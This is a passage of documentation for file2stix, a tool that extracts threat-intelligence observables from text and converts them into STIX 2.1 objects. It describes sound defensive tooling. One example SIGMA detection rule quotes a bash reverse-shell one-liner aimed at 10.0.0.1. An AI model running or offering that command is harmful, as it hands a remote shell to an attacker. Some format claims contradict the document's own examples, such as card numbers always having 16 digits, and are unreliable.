IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"AS<EXTRACTED NUMERICAL AS OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ autonomous-system:number = '<EXTRACTED NUMERICAL AS OBSERVABLE VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] } STIX 2.1 autonomous-system SCO \u00b6 { \"type\": \"autonomous-system\", \"spec_version\": \"2.1\", \"id\": \"autonomous-system--<GENERATED BY STIX2 LIBRARY>\", \"number\": \"<EXTRACTED NUMERICAL AS OBSERVABLE VALUE>\" } 13. Cryptocurrency Observables ( indicator ) \u00b6 Including: e.g. BTC transaction 3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5 e.g. ETH transaction 0xb794f5ea0ba39494ce839613fffba74279579268 e.g. XMR transaction 888tNkZrPN6JsEgekjMnABU4TBzc2Dt29EPAvkRxbANsAnjyPbb3iQ1YBRk1UXcdRsiKc9dhw Each of these address formats has a defined length and allowed characters that can be extracted using a regex pattern. For example, Bitcoin addresses is 58 characters . Cryptocurrency Observables are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) / Here is how cryptocurrency observables are represented in STIX 2.1 by file2stix; STIX 2.1 extension-definition \u00b6 As STIX 2.1 does not natively have an extension for cryptocurrency, file2stix uses a custom SCO; https://github.com/signalscorps/stix2-objects/blob/main/extension-definition/new-sco/cryptocurrency-transaction/extension-definition-bef728e0-53cb-11ed-bdc3-0242ac120002/20220101000000000.json STIX 2.1 cryptocurrency transaaction SCO \u00b6 { \"type\": \"cryptocurrency-transaction\", \"spec_version\": \"2.1\", \"id\": \"cryptocurrency-transaction--<GENERATED BY STIX2 LIBRARY>\", \"currency_symbol\": \"<DETECTED CURRENCY TYPE>\", \"address\": \"<EXTRACTED CRYPTOCURRENCY OBSERVABLE VALUE>\", \"extensions\": { \"extension-definition--532ae28d-137b-4b89-afb7-9cf9b504191b\" : { \"extension_type\" : \"new-sco\" } } } STIX 2.1 indicator SDO \u00b6 { \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"<CRYPTO TYPE> Transaction: <EXTRACTED CRYPTOCURRENCY OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ cryptocurrency-transaction:address = '<EXTRACTED CRYPTOCURRENCY OBSERVABLE VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] } 14. CVE Observables ( vulnerability ) \u00b6 e.g. Full CVE IDs CVE-2022-00001 CVE's always follow the format CVE-YYYY-DDDDD , where YYYY is the year and DDDDD is the numeric ID of the CVE. CVE Observables are represented by the STIX Vulnerability SDOs ( \"type\": \"vulnerability\" ) . Here is how CVE observables are represented in STIX 2.1 by file2stix; STIX 2.1 vulnerability extension-definition \u00b6 https://raw.githubusercontent.com/signalscorps/stix2-objects/main/extension-definition/property-extension/nvd-cve-extension/extension-definition--b2b5f2cd-49e6-4091-a0e0-c0bb71543e23/20220101000000000.json STIX 2.1 vulnerability SDO \u00b6 Imported from cvestix-output database using cve ids -- includes relationships. STIX 2.1 indictor extension-definition \u00b6 https://raw.githubusercontent.com/signalscorps/stix2-objects/main/schemas/property-extension/cve2stix-enrichment-extension/example.json STIX 2.1 indicator SDO \u00b6 Imported from cvestix-output database using cve ids -- includes relationships. 15. Country Observables ( location ) \u00b6 Including: Country Name (e.g. United Kingdom ) Country Code (e.g. UK ) English country names and codes can be identified by standard definition dictionaries, for example . Countries are represented by the STIX Location SDOs ( \"type\": \"location\" ) . Here is how Country observables are represented in STIX 2.1 by file2stix; STIX 2.1 location SDO \u00b6 { \"type\": \"location\", \"spec_version\": \"2.1\", \"id\": \"location--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"name\": \"Country: <EXTRACTED / CONVERTED FULL COUNTRY NAME OBSERVABLE VALUE>\", \"country\": \"<EXTRACTED / CONVERTED COUNTRY ISO OBSERVABLE VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] } Note, in the case of Country Name extractions, the country name needs to be converted to a two character ISO 3166-1 ALPHA-2 Code for the country property. 16. Credit Card Observables ( indicator ) \u00b6 e.g. Mastercard 5555555555554444 e.g. Visa 4242424242424242 e.g. AMEX 378282246310005 e.g. Union Pay 6200000000000005 e.g. Diners 3056930009020004 e.g. JCB 3566002020360505 e.g. Discover 6011111111111117 Card Numbers are always 16 digits long and the type of card can be determined by the first four digits (e.g. 4242 for Visa). Therefore it is easy to identify card numbers using regular expressions . These are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) . Here is how credit card observables are represented in STIX 2.1 by file2stix; STIX 2.1 extension-definition \u00b6 As STIX 2.1 does not natively have an extension for credit cards, file2stix uses a custom SCO; https://raw.githubusercontent.com/signalscorps/stix2-objects/main/extension-definition/new-sco/credit-card/extension-definition--abd6fc0e-749e-4e6c-a20c-1faa419f5ee4/20220101000000000.json STIX 2.1 credit-card SCO \u00b6 { \"type\": \"credit-card\", \"spec_version\": \"2.1\", \"id\": \"credit-card--<GENERATED BY STIX2 LIBRARY>\", \"issuer\": \"<CREDIT CARD TYPE>\", \"number\": \"<CREDIT CARD NUMBER>\", \"extensions\": { \"extension-definition--abd6fc0e-749e-4e6c-a20c-1faa419f5ee4\" : { \"extension_type\" : \"new-sco\" } } } STIX 2.1 indicator SDO \u00b6 { \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"<CARD TYPE> Credit Card: <EXTRACTED CREDIT CARD OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ credit-card:number = '<EXTRACTED CREDIT CARD OBSERVABLE VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] } 17. Bank Account Observables ( indicator ) \u00b6 In the case of file2stix bank accounts are identified using IBAN numbers. * e.g. German IBAN DE29100500001061045672 * e.g. Great Britain IBAN GB94BARC10201530093459 IBAN numbers start with the country code. The country determines the length of the IBAN number and the structure (they are not all the same). However, as each countries structure must follow the same format a regular expression can be used to match all IBAN country variations . IBANs are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) . Here is how IBAN number observables are represented in STIX 2.1 by file2stix; STIX 2.1 extension-definition \u00b6 As STIX 2.1 does not natively have an extension for IBANs, file2stix uses a custom SCO; https://raw.githubusercontent.com/signalscorps/stix2-objects/main/extension-definition/new-sco/bank-account/extension-definition--349c1029-4052-4635-a064-263cb17290ea/20220101000000000.json STIX 2.1 bank-account SCO \u00b6 { \"type\": \"bank-account\", \"spec_version\": \"2.1\", \"id\": \"bank-account--<GENERATED BY STIX2 LIBRARY>\", \"iban_number\": \"<FULL IBAN NUMBER INCLUDING COUNTRY CODE>\", \"extensions\": { \"extension-definition--349c1029-4052-4635-a064-263cb17290ea\": { \"extension_type\" : \"new-sco\" } } } STIX 2.1 indicator SDO \u00b6 { \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"Bank account: <EXTRACTED IBAN OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ bank-account:iban_number = '<EXTRACTED IBAN OBSERVABLE VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] } 18. YARA Rule Observables ( indicator ) \u00b6 e.g. rule dummy { condition: false } YARA rules are can be identified using pattern matching as they always start with rule and end with } . YARA Rules are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) with \"pattern_type\": \"yara\" . Here is how YARA Rule observables are represented in STIX 2.1 by file2stix; STIX 2.1 indicator SDO \u00b6 { \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"YARA Rule: <RULE NAME>\", \"pattern_type\": \"yara\", \"pattern\": \"<YARA RULE>\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] } The YARA rule is first encoded with JSON escapes before it is saved in the pattern value. e.g. rule dummy\\r\\n{\\r\\n condition:\\r\\n false\\r\\n} The <RULE NAME> is defined between the text rule and first { (e.g. dummy in the last example). 19. SIGMA Rule Observables ( indicator ) \u00b6 e.g. title: Linux Reverse Shell Indicator id: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871 status: experimental description: Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1') date: 2021/10/16 author: Florian Roth logsource: product: linux category: network_connection detection: selection: Image|endswith: '/bin/bash' filter: DestinationIp: - '127.0.0.1' - '0.0.0.0' condition: selection and not filter SIGMA Rules are detected if valid YAML containing three top level fields title , logsource and detection is present. If the three field names are detected, entire YAML content is ingested as the SIGMA rule. SIGMA Rules are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) with \"pattern_type\": \"sigma\" . Here is how SIGMA Rule observables are represented in STIX 2.1 by file2stix; STIX 2.1 extension-definition \u00b6 https://github.com/signalscorps/stix2-objects/blob/main/extension-definition/property-extension/sigma-rule-extension/extension-definition--94f4bdb6-7f39-4d0a-b103-f787026963a6/20220101000000000.json STIX 2.1 indicator SDO \u00b6 { \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"SIGMA Rule: <SIGMA RULE TITLE>\", \"pattern_type\": \"sigma\", \"pattern\": \"<SIGMA RULE>\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ], \"external_references\": [ { \"source_name\": \"Sigma Rule Reference\", \"url\": \"<SIGMA RULE REFERENCES[0]>\" } ], \"extensions\": { \"extension-definition--94f4bdb6-7f39-4d0a-b103-f787026963a6\": { \"extension_type\": \"property-extension\", \"sigma_rule\": { \"title\": \"<SIGMA RULE TITLE>\", \"id\": \"<SIGMA RULE ID>\", \"date\": \"<SIGMA RULE DATE>\", \"modified\": \"<SIGMA RULE MODIFIED>\", \"related\": [ { \"id\": \"<SIGMA RULE RELATED.ID[0]>\", \"type\": \"<SIGMA RULE RELATED.TYPE[0]>\" } ], \"status\": \"<SIGMA RULE STATUS>\", \"description\": \"<SIGMA RULE DESCRIPTION>\", \"license\": \"<SIGMA RULE LICENSE>\", \"author\": \"<SIGMA RULE AUTHOR>\", \"references\": [ \"<SIGMA RULE REFERENCES[0]>\" ], \"fields\": [ \"<SIGMA RULE FIELDS[0]>\" ], \"falsepositives\": [ \"<SIGMA RULE FALSEPOSITIVES[0]>\" ], \"level\": \"<SIGMA RULE LEVEL>\", \"tags\": [ \"<SIGMA RULE TAGS[0]>\" ], \"logsource\": { \"category\": \"<SIGMA RULE LOGSOURCE.CATEGORY>\", \"product\": \"<SIGMA RULE LOGSOURCE.PRODUCT>\", \"service\": \"<SIGMA RULE LOGSOURCE.SERVICE>\", \"definition\": \"<SIGMA RULE LOGSOURCE.DEFINITION>\" }, \"detection\": [ \"<SIGMA RULE DETECTION[0]>\" ] } } } } The SIGMA RULE is encoded with JSON escapes before being written into the pattern value. e.g. title: Linux Reverse Shell Indicator\\r\\nid: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871\\r\\nstatus: experimental\\r\\ndescription: Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& \\/dev\\/tcp\\/10.0.0.1\\/4242 0>&1')\\r\\ndate: 2021\\/10\\/16\\r\\nauthor: Florian Roth\\r\\nlogsource:\\r\\n product: linux\\r\\n category: network_connection\\r\\ndetection:\\r\\n selection:\\r\\n Image|endswith: '\\/bin\\/bash'\\r\\n filter:\\r\\n DestinationIp: \\r\\n - '127.0.0.1'\\r\\n - '0.0.0.0'\\r\\n condition: selection and not filter The <RULE NAME> is defined by the value in the title: field of the YAML rule. 20. CPE Observables ( software ) \u00b6 e.g. Full CPE URI cpe:2.3:o:apple:mac_os_x:10.1.3:*:*:*:*:*:*:* CPEs can be identified as they start with cpe: and have 12 separators : in total. CPEs are represented by STIX Software SCOs ( \"type\": \"software\" ) STIX 2.1 Indicator SDO \u00b6 { \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"CPE: <EXTRACTED CPE URI>\", \"pattern_type\": \"stix\", \"pattern\": \"[ software:cpe = '<EXTRACTED CPE URI>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] } STIX 2.1 software SCO \u00b6 Imported from cvestix-output database using cpe uris -- includes relationships. 21. MITRE ATT&CK Observables \u00b6 I have created an extensive MITRE ATT&CK tutorial I recommend reading if you are new to the framework . file2stix is designed to identify ATT&CK data found in text using keyword matches on the name , external_references.external_id (where \"source_name\": \"mitre-attack\" for Enterprise ATT&CK or \"source_name\": \"mitre-mobile-attack\" for mobile ATT&CK) and x_mitre_aliases (when exists) fields inside the STIX object representing it. Take the ATT&CK sub-technique 1053.005: Scheduled Task . You will see; \"name\": \"Scheduled Task\", and { \"source_name\": \"mitre-attack\", \"external_id\": \"T1053.005\", \"url\": \"https://attack.mitre.org/techniques/T1053/005\" }, Therefore, the dictionary entries to identify this ATT&CK Object are Scheduled Task and T1053.005 (case insensitive). The following ATT&CK data types from the Enterprise and Mobile and ICS matrices are supported in this way; Techniques ( attack-pattern ) Sub-Technique ( attack-pattern ) Tactic ( x-mitre-tactic-- ) Course of Action ( course-of-action ) Intrusion Set ( intrusion-set ) Malware ( malware ) Tool ( tool ) Data Sources ( x-mitre-data-source ) In the case of a dictionary match to a MITRE ATT&CK STIX Object, no new object is actually created. A new Relationship Object is created between the created STIX Report SDO with imported ATT&CK STIX Object. The ATT&CK STIX Object remains unmodified. For example, if the uploaded text contained 1053.005 it would match to the ATT&CK Object 1053.005: Scheduled Task and an SRO would be created between the Report SDO and this Attack Pattern SDO. 22. MITRE CAPEC Observables \u00b6 CAPECs are extracted in a very similar way to ATT&CK objects, using a dictionary. file2stix can identify ATT&CK data found in text using keyword matches on the name and external_references.external_id (where \"source_name\": \"capec\" ) fields inside the STIX object representing it. Take CAPEC-170 Web Application Fingerprinting . You will see; \"name\": \"Web Application Fingerprinting\", and { \"external_id\": \"CAPEC-170\", \"source_name\": \"capec\", \"url\": \"https://capec.mitre.org/data/definitions/170.html\" }, Therefore, the dictionary entries to identify this CAPEC Object are Web Application Fingerprinting and CAPEC-170 (case insensitive). The following CAPEC data types are supported in this way; CAPEC ( attack-pattern ) In the case of a dictionary match to a MITRE CAPEC STIX Object, no new object is created. A new Relationship Object is created between the created STIX Report SDO with imported CAPEC STIX Object. The CAPEC STIX Object remains unmodified. For example, if the uploaded text contained CAPEC-170 it would match to the CAPEC Object CAPEC-170 Web Application Fingerprinting and an SRO would be created between the Report SDO and this Attack Pattern SDO. 23. Lookups \u00b6 For matches that cannot be easily captured by patterns, but are widely known (i.e. not suited to custom extraction for all file2stix users), automatic lookup tables have been added. You can view the lookups in file2stix/lookups . There lookups work by comparing the input text to the text matches in the lookup files. The lookup file is structured like so; # extraction string / regex, type (either string / regex), stix object used for match \"EXTRACTION STRING\",string,STIX-OBJECT-TYPE \"EXTRACTION REGEX\",regex,STIX-OBJECT-TYPE When the extraction (either string or regular expression) matches the input text, then it will create a STIX 2.1 object of the type defined. If you do not want to use a lookup, you can pass the --ignore-lookup flag, followed by the file name (excluding file extension), e.g. --ignore-lookup threat-actors threat-actors . You can modify these lookups, or add new ones, however we generally recommend you use custom extractions to do this (which are defined in the same way) because your changes to lookups might be lost with file2stix updates. 24. Custom Extractions \u00b6 You can also write your own custom extractions using either exact text matches or regular expressions. Custom extractions can be written and stored in a plain text file that can be passed when running the script as --custom-extraction-file . Inside the custom extraction file you must specify an extraction string or regex extraction type (either regex or sting ) the STIX 2.1 Object or MITRE / CAPEC Object to use when a match is detected file2stix uses re for regex matching. You can pass multiple custom extractions on each line of the file like so (this is the same format as for lookups too); \"EXTRACTION STRING\",string,STIX-OBJECT-TYPE \"EXTRACTION REGEX\",regex,STIX-OBJECT-TYPE For example; \"Fancy Bear\",string,attack-pattern And \"Fancy*\",regex,attack-pattern Would both match the text \"Fancy Bear\" found in an input file. The secound would also match \"FancyBear\", \"Fancy Cat\", \"Fancy Dog\", ect. The following STIX 2.1 Objects are supported by custom extractions: Attack Pattern ( attack-pattern ) Campaign ( campaign ) Course of Action ( course-of-action ) Infrastructure ( infrastructure ) Intrusion Set ( intrustion-set ) Malware ( malware ) Threat Actor ( threat-actor ) Tool ( tool ) e.g. to search a document for the string \"RYUK\" and create a Malware STIX 2.1 SDO if a match is identified; \"ryuk\",string,malware You can also create multiple custom extractions in the same file by adding multiple lines, e.g. \"ryuk\",malware \"darkhotel\",string,malware \"patch\",string,course-of-action You can see an example custom extraction file in tests/file_inputs/custom_extractions/test_extractions.txt","title":"3.2. Analysis Mode (default)"},{"location":"extractions-analysis-mode/#extractions-analysis-mode","text":"Analysis mode creates generic STIX 2.1 representing threat intel. It is recommended this mode is used when inputting generic threat intel into file2stix (rather than organisational specific observed intelligence).","title":"Extractions: Analysis Mode"},{"location":"extractions-analysis-mode/#sco-creation-logic","text":"Note, SCOs are created from Patterns in SDOs. e.g. [ipv4-addr:value='1.1.1.1'] become an SCO of \"type\": \"ipv4-addr with a \"value\": \"1.1.1.1\" This is done by pattern2sco: https://github.com/signalscorps/pattern2sco","title":"SCO creation logic"},{"location":"extractions-analysis-mode/#11-ipv4-address-observables-without-port-indicator","text":"e.g. 198.51.100.3 e.g. 198.51.100.0/24 (with CIDR) Lots of IPv4 extraction logic exists on the internet ( for example ). IPv4 Address Observables are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) , using the STIX IPv4 Address SCO ( \"type\": \"ipv4-addr\" ) to create the Indicator SDO pattern property. Here is how ipv4 observables are represented in STIX 2.1 by file2stix;","title":"1.1 IPv4 Address Observables without port (indicator)"},{"location":"extractions-analysis-mode/#stix-21-indicator-sdo","text":"{ \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"ipv4: <EXTRACTED IPV4 OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ ipv4-addr:value = '<EXTRACTED IPV4 OBSERVABLE VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] }","title":"STIX 2.1 indicator SDO"},{"location":"extractions-analysis-mode/#stix-21-ipv4-addr-sco","text":"{ \"type\": \"ipv4-addr\", \"spec_version\": \"2.1\", \"id\": \"ipv4-addr--<GENERATED BY STIX2 LIBRARY>\", \"value\": \"<EXTRACTED IPV4 OBSERVABLE VALUE>\", \"defanged\": \"<DEFANGED BOOLEAN>\" }","title":"STIX 2.1 ipv4-addr SCO"},{"location":"extractions-analysis-mode/#12-ipv4-address-observables-with-port-indicator","text":"e.g. 198.51.100.0:80 (with port) Note for ipv4 and port observables, the representation is slightly different. When an IPv4 and port is detected (e.g. 1.1.1.1:80 ) and Indicator SDO with the following structure is created:","title":"1.2 IPv4 Address Observables with port (indicator)"},{"location":"extractions-analysis-mode/#stix-21-indicator-sdo_1","text":"{ \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"ipv4: <EXTRACTED IPV4 OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ ipv4-addr:value = '<EXTRACTED IPV4 OBSERVABLE VALUE>' AND network-traffic:dst_port = '<EXTRACTED IPV4 PORT VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] }","title":"STIX 2.1 indicator SDO"},{"location":"extractions-analysis-mode/#stix-21-ipv4-addr-and-network-traffic-sco","text":"{ \"type\": \"ipv4-addr\", \"spec_version\": \"2.1\", \"id\": \"ipv4-addr--<GENERATED BY STIX2 LIBRARY>\", \"value\": \"<EXTRACTED IPV4 OBSERVABLE VALUE>\", \"defanged\": \"<DEFANGED BOOLEAN>\" } { \"type\": \"network-traffic\", \"spec_version\": \"2.1\", \"id\": \"network-traffic--<GENERATED BY STIX2 LIBRARY>\", \"dst_ref\": \"ipv4-addr--<IPV4 OBJECT ID>\", \"dst_port\": \"<EXTRACTED IPV4 PORT VALUE>\", \"protocols\": [ \"ipv4\" ] }","title":"STIX 2.1 ipv4-addr and network-traffic SCO"},{"location":"extractions-analysis-mode/#21-ipv6-observables-without-port-indicator","text":"e.g. 2001:0db8:85a3:0000:0000:8a2e:0370:7334 e.g. 2002::abcd:ffff:c0a8:101/64 Lots of IPv4 extraction logic exists on the internet ( for example ). IPv6 Observables are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) , using the STIX IPv6 Address SCO ( \"type\": \"ipv6-addr\" ) to create the Indicator SDO pattern property. Here is how ipv6 observables are represented in STIX 2.1 by file2stix;","title":"2.1 IPv6 Observables without port (indicator)"},{"location":"extractions-analysis-mode/#stix-21-indicator-sdo_2","text":"{ \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"ipv6: <EXTRACTED IPV6 OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ ipv6-addr:value = '<EXTRACTED IPV6 OBSERVABLE VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] }","title":"STIX 2.1 indicator SDO"},{"location":"extractions-analysis-mode/#stix-21-ipv6-addr-sco","text":"{ \"type\": \"ipv6-addr\", \"spec_version\": \"2.1\", \"id\": \"ipv4-addr--<GENERATED BY STIX2 LIBRARY>\", \"value\": \"<EXTRACTED IPV6 OBSERVABLE VALUE>\", \"defanged\": \"<DEFANGED BOOLEAN>\" }","title":"STIX 2.1 ipv6-addr SCO"},{"location":"extractions-analysis-mode/#22-ipv6-observables-with-port-indicator","text":"e.g. [2001:0db8:85a3:0000:0000:8a2e:0370:7334]:80 Note for ipv6 and port observables, the representation is slightly different. When an IPv6 and port is detected (e.g. [2001:0db8:85a3:0000:0000:8a2e:0370:7334]:80 ) and Indicator SDO with the following structure is created:","title":"2.2 IPv6 Observables with port (indicator)"},{"location":"extractions-analysis-mode/#stix-21-indicator-sdo_3","text":"{ \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"ipv6: <EXTRACTED IPV6 OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ ipv6-addr:value = '<EXTRACTED IPV6 OBSERVABLE VALUE WITH [] REMOVED>' AND network-traffic:dst_port = '<EXTRACTED IPV6 PORT VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] }","title":"STIX 2.1 indicator SDO"},{"location":"extractions-analysis-mode/#stix-21-ipv6-addr-and-network-traffic-sco","text":"{ \"type\": \"ipv6-addr\", \"spec_version\": \"2.1\", \"id\": \"ipv4-addr--<GENERATED BY STIX2 LIBRARY>\", \"value\": \"<EXTRACTED IPV6 OBSERVABLE VALUE>\", \"defanged\": \"<DEFANGED BOOLEAN>\" } { \"type\": \"network-traffic\", \"spec_version\": \"2.1\", \"id\": \"network-traffic--<GENERATED BY STIX2 LIBRARY>\", \"dst_ref\": \"ipv4-addr--<IPV6 OBJECT ID>\", \"dst_port\": \"<EXTRACTED IPV6 PORT VALUE>\", \"protocols\": [ \"ipv6\" ] }","title":"STIX 2.1 ipv6-addr and network-traffic SCO"},{"location":"extractions-analysis-mode/#3-domain-name-observables-indicator","text":"e.g. domain example.com e.g. sub domain test.example.com Lots of domain extraction logic exists on the internet ( for example ). It is generally a good idea to also use a dictionary to validate the top level domain to ensure it is a domain (and not a file extension). Lots of TLD dictionaries exist to do this , although ensuring they are current can be a challenge. Domain Name Observables are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) , using the STIX Domain Name SCO ( \"type\": \"domain-name\" ) to create the Indicator SDO pattern property. Here is how domain name observables are represented in STIX 2.1 by file2stix;","title":"3. Domain Name Observables (indicator)"},{"location":"extractions-analysis-mode/#stix-21-indicator-sdo_4","text":"{ \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": 